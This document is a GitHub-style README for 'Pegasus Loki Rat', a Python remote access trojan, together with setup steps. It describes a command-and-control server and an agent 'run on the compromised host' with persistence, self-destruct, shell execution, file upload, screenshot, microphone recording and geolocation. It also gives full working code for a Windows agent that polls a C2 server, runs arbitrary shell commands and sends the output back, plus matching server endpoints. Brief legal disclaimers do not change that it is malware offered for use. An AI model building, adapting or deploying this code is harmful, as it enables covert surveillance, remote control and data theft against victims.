# Pegasus Loki Rat

![Loki.Rat](https://github.com/sobri3195/pegasus-loki-rat/blob/master/Lokirat.jpg)

Loki.Rat is a fork of the [Pegasus Loki RAT](https://github.com/sobri3195/Ares), it integrates new modules, like recording, lockscreen, and locate options.
Loki.Rat is a Python Remote Access Tool.

# Join our Telegram Channel [Loki.Rat](https://t.me/cybersecuritydown)

[![How to Use Loki.Rat]

Warning: Only use this software according to your current legislation. Misuse of this software can raise legal and ethical issues which I don't support nor can be held responsible for.
![Loki.Rat](https://3.bp.blogspot.com/-hCo9eJTSH5Y/WknUCULBwUI/AAAAAAAAAtY/i08DjoFqwLUsmnXhI7e5YX9AJuZmrjitQCLcBGAs/s1600/1234.png)

Loki.Rat is made of two main programs:

- A Command and Control server, which is a Web interface to administer the agents
- An agent program, which is run on the compromised host, and ensures communication with the CNC

The Web interface can be run on any server running Python. The agent[Payload] can be compiled to native executables using pyinstaller.

# Setup

Install The Loki.Rat

Open a terminal window and type this command:

```
     git clone https://github.com/sobri3195/pegasus-loki-rat.git
     cd Loki.Rat
```

Install the Python modules requirements:

```
     pip install -r requirements.txt
```

Initialize the database:

```
     cd server
     ./loki.py initdb
```

In order to compile Windows agents on Linux, setup wine (optional):

```
     ./wine_setup.sh
```

## Server

Run with the built-in (debug) server:

```
     ./loki.py runserver -h 127.0.0.1 -p 8080 --threaded
```

Or run using gunicorn:

```
     gunicorn loki:app -b 127.0.0.1:8080 --threads 20
```

The server should now be accessible on http://127.0.0.1:8080

## Payload

Run the Python payload (update config.py to suit your needs):

```
     cd payload
     ./payload.py
```

Build a new payload to a standalone binary:

```
     ./builder.py -p Linux --server http://localhost:8080 -o payload
     ./payload
```

To see a list of supported options, run ./builder.py -h

```
     ./payload/builder.py -h
     usage: builder.py [-h] -p PLATFORM --server SERVER -o OUTPUT
                    [--hello-interval HELLO_INTERVAL] [--idle_time IDLE_TIME]
                    [--max_failed_connections MAX_FAILED_CONNECTIONS]
                    [--persistent]

     Builds a Loki.Rat payload

     optional arguments:
     -h, --help            show this help message and exit
     -p PLATFORM, --platform PLATFORM
                         Target platform (Windows, Linux).
     --server SERVER       Address of the CnC server (e.g http://127.0.0.1:8080).
     -o OUTPUT, --output OUTPUT
                         Output file name.
     --hello-interval HELLO_INTERVAL
                        Delay (in seconds) between each request to the CnC.
     --idle_time IDLE_TIME
                         Inactivity time (in seconds) after which to go idle.
                         In idle mode, the agent pulls commands less often
                         (every <hello_interval> seconds).
     --max_failed_connections MAX_FAILED_CONNECTIONS
                         The agent will self-destruct if no contact with the
                         CnC can be made <max_failed_connections> times in a
                         row.
     --persistent          Automatically install the agent on first run.
```

![Pegasus-Loki.Rat]
Supported payload commands

```
     <any shell command>
     Executes the command in a shell and return its output.

     upload <local_file>
     Uploads <local_file> to server.

     download <url> <destination>
     Downloads a file through HTTP(S).

     zip <archive_name> <folder>
     Creates a zip archive of the folder.

     screenshot
     Takes a screenshot.

     python <command|file>
     Runs a Python command or local file.

     persist
     Installs the agent.

     clean
     Uninstalls the agent.

     exit
     Kills the agent.
   
     record
          -h, --help            show this help message and exit
          -t RECORD_SECONDS, --time RECORD_SECONDS
                                Set a timing in seconds for record. (e.g 10)
          -c CHANNELS, --channel CHANNELS
                                Channel for the microphone (e.g 2).
          -ch CHUNK, --chunk CHUNK
                                Chunk for the microphone (e.g 1024).
          -r RATE, --rate RATE  Rate (e.g 44100).
    
     lockscreen
     lock screen only on windows and Linux with Gnome environment
   
     Geolocation
     locate the target machine, and print the Latitude and Longitude
    
     help
     This help.
```

Muhammad Sobri Maulana - Pegasus Hacker

# Windows Agent Development

To develop a Windows agent that runs in the background, continuously connects to the server, receives commands, and sends back outputs, create a Python script as follows:

```python
# windows_agent.py
import requests
import subprocess
import time
import json

SERVER_URL = "http://SERVER_IP:5000"  # Enter the server IP here
AGENT_ID = "WINDOWS_PC_001"  # Unique agent ID

def execute_command(command):
    try:
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=60
        )
        return result.stdout, result.stderr, result.returncode
    except Exception as e:
        return "", str(e), -1

def main():
    while True:
        try:
            # Check for commands
            response = requests.get(
                f"{SERVER_URL}/agent_get_commands",
                params={"agent_id": AGENT_ID},
                timeout=30
            )
        
            if response.status_code == 200:
                commands = response.json().get('commands', [])
            
                for cmd in commands:
                    # Execute the command
                    stdout, stderr, returncode = execute_command(cmd['command'])
                
                    # Send the result back to the server
                    requests.post(
                        f"{SERVER_URL}/agent_response",
                        json={
                            'agent_id': AGENT_ID,
                            'command_id': cmd['id'],
                            'output': stdout,
                            'error': stderr,
                            'return_code': returncode
                        }
                    )
        
            # Update connection status
            requests.post(
                f"{SERVER_URL}/agent_heartbeat",
                json={'agent_id': AGENT_ID, 'status': 'online'}
            )
        
        except requests.exceptions.RequestException:
            # Connection error - retry
            pass
    
        time.sleep(30)  # Check every 30 seconds

if __name__ == "__main__":
    main()
```

## 2. Extend the Server API Endpoints

Add the following endpoints to your existing Flask API:

```python
# Add new endpoints to api.py

@api.route('/agent_get_commands', methods=['GET'])
def agent_get_commands():
    """
    Returns pending commands for the agent to execute
    """
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify({'ok': False, 'error': 'agent_id required'}), 400
  
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if not agent:
        return jsonify({'commands': []})
  
    # Get unprocessed commands
    commands = Command.query.filter_by(
        agent_id=agent.id, 
        executed=False
    ).order_by(Command.created_at.asc()).all()
  
    command_list = [{
        'id': c.id,
        'command': c.command,
        'created_at': c.created_at.isoformat()
    } for c in commands]
  
    return jsonify({'commands': command_list})

@api.route('/agent_response', methods=['POST'])
def agent_response():
    """
    Processes command outputs from the agent
    """
    data = request.get_json()
    agent_id = data.get('agent_id')
    command_id = data.get('command_id')
    output = data.get('output')
    error = data.get('error')
    return_code = data.get('return_code')
  
    if not all([agent_id, command_id]):
        return jsonify({'ok': False, 'error': 'Missing parameters'}), 400
  
    # Find and update the command
    command = Command.query.get(command_id)
    if command:
        command.executed = True
        command.output = output
        command.error = error
        command.return_code = return_code
        command.completed_at = datetime.utcnow()
        db.session.commit()
  
    return jsonify({'ok': True})

@api.route('/agent_heartbeat', methods=['POST'])
def agent_heartbeat():
    """
    Receives heartbeat signals from the agent
    """
    data = request.get_json()
    agent_id = data.get('agent_id')
    status = data.get('status')
  
    if not agent_id:
        return jsonify({'ok': False, 'error': 'agent_id required'}), 400
  
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if agent:
        agent.last_seen = datetime.utcnow()
        agent.status = status
        db.session.commit()
  
    return jsonify({'ok': True})

@api.route('/processes', methods=['GET'])
def get_processes():
    """
    Lists Windows processes
    """
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify({'ok': False, 'error': 'agent_id required'}), 400
  
    # Send the process list command to the agent
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if agent:
        command = "tasklist /FO CSV /NH"
        agent.push_command(command)
        return jsonify({'ok': True, 'message': 'Process list command queued'})
  
    return jsonify({'ok': False, 'error': 'Agent not found'}), 404
```

## 3. Update Database Models

Add new fields to your model file:

```python
# models.py
class Agent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(100), unique=True, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_seen = db.Column(db.DateTime)
    status = db.Column(db.String(20), default='offline')
    commands = db.relationship('Command', backref='agent', lazy=True)

class Command(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.Integer, db.ForeignKey('agent.id'), nullable=False)
    command = db.Column(db.String(500), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    executed = db.Column(db.Boolean, default=False)
    completed_at = db.Column(db.DateTime)
    output = db.Column(db.Text)
    error = db.Column(db.Text)
    return_code = db.Column(db.Integer)
```

## 4. Windows Process Management Commands

Example commands that can be sent to the agent:

```python
# To get the process list
"tasklist /FO CSV /NH"

# To terminate a specific process
"taskkill /PID <PID> /F"

# To start a new process
"start <program>"

# For file operations
"dir C:\\ /S /B"  # List files
"type C:\\path\\to\\file.txt"  # Read file content
```

## 5. Reconnection Mechanism for Connection Drops

To ensure the agent reconnects on connection drops:

```python
# Add to windows_agent.py
def robust_request(method, url, **kwargs):
    max_retries = 5
    for attempt in range(max_retries):
        try:
            response = requests.request(method, url, timeout=30, **kwargs)
            return response
        except requests.exceptions.RequestException:
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)  # Exponential backoff
            else:
                raise
    return None
```

## 6. Analysis to be Sent to AI

The system you developed for communication with the Windows PC includes the following components:

1. **Server API**: Command queue management with a Flask-based REST API
2. **Windows Agent**: A continuously running client that processes commands and sends results
3. **Database**: SQL database tracking commands and agent status
4. **Communication Protocol**: JSON-based communication over HTTP/HTTPS
5. **Reconnection Mechanism**: Exponential backoff algorithm managing connection drops

With this system, you can:

- Remotely manage Windows processes
- Access the file system
- Track command outputs in real-time
- Automatically reconnect on connection drops

**Important Note**: Such systems should only be used on authorized systems and for ethical hacking/system administration purposes. Necessary legal permissions should be obtained before use.
